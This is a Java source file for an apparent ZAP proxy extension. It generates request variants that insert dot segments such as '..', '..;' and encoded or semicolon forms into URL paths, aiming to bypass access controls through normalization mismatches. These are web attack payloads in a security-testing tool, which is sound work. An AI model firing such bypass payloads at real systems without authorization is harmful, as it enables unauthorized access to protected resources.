package org.zaproxy.zap.extension.hacktor.technique;

import org.parosproxy.paros.network.HttpMessage;
import org.zaproxy.zap.extension.hacktor.Technique;
import java.util.ArrayList;
import java.util.List;
import java.util.function.BiConsumer;

/**
 * Inline dot-segment normalization injection.
 *
 * Inserting "." and ".." (and the Tomcat-family "..;") as standalone segments inside
 * the middle of a path makes some proxies and web servers normalize the URL before
 * applying access control, collapsing the request to a different resource than the one
 * the middleware authorized. This is distinct from prefix/suffix traversal because the
 * injected segments sit between existing ones and are removed by RFC 3986 normalization.
 */
public class MidPathDotTechniqueBuilder extends AbstractTechniqueBuilder {
    @Override public String getFamily() { return "Mid-Path Dot"; }
    @Override public int getOrder() { return 53; }

    @Override
    public void build(List<Technique> techs, BiConsumer<HttpMessage, String> setPath,
                      TechniqueBuilder.PathContext ctx) {
        String[] segments = ctx.rawSegments;
        String[][] injectables = {
            {".",       "insert '.' empty segment"},
            {"..",      "insert '..' parent segment"},
            {"..;",     "insert '..;' path-param segment"},
            {"./",      "insert './'"},
            {"./.",     "insert './.'"},
            {"%2e",     "insert encoded '.'"},
            {"%2e%2e",  "insert encoded '..'"},
        };

        for (String[] inj : injectables) {
            final String token = inj[0];
            final String desc = inj[1];
            // Insert at each boundary (before each segment starting at index 0)
            for (int i = 0; i <= segments.length; i++) {
                final int b = i;
                techs.add(new Technique("Mid-Path Dot", "MidDot:" + trunc(token.replace(".","D").replace("%","P").replace(";","SC"), 10) + "@" + b,
                    desc + " before segment [" + b + "]",
                    base -> {
                        List<String> seg = new ArrayList<>();
                        for (int s = 0; s < segments.length; s++) {
                            if (s == b) seg.add(token);
                            seg.add(segments[s]);
                        }
                        if (b == segments.length) seg.add(token);
                        HttpMessage c = cloneMsg(base); setPath.accept(c, joinPath(seg.toArray(new String[0]))); return c; }));
            }
        }

        // Inline double-dot which collapses the previous real segment: a/../b -> b
        for (int i = 1; i < segments.length; i++) {
            final int b = i;
            techs.add(new Technique("Mid-Path Dot", "MidDotCollapse:" + b,
                "Insert '../' between segments [" + (b-1) + "] and [" + b + "] to collapse [" + (b-1) + "]",
                base -> {
                    List<String> seg = new ArrayList<>();
                    for (int s = 0; s < segments.length; s++) {
                        if (s == b) seg.add("..");
                        seg.add(segments[s]);
                    }
                    HttpMessage c = cloneMsg(base); setPath.accept(c, joinPath(seg.toArray(new String[0]))); return c; }));
        }

        // Encoded-dot parents with semicolon variants
        String[] semiDot = {
            "/..;/", "/..%3b/", "/.%2e%2e;/", "/%2e%2e%3b/"
        };
        for (String p : semiDot) {
            final String tok = p;
            techs.add(new Technique("Mid-Path Dot", "MidDotSemi:" + trunc(p.replace("/","S").replace(".","D").replace("%","P").replace(";","SC"), 12),
                "Injected path-param dot: " + p,
                base -> {
                    StringBuilder sb = new StringBuilder();
                    for (int s = 0; s < segments.length; s++) {
                        sb.append("/").append(segments[s]);
                        if (s == 0) sb.append(tok);
                    }
                    HttpMessage c = cloneMsg(base); setPath.accept(c, sb.toString()); return c; }));
        }
    }
}
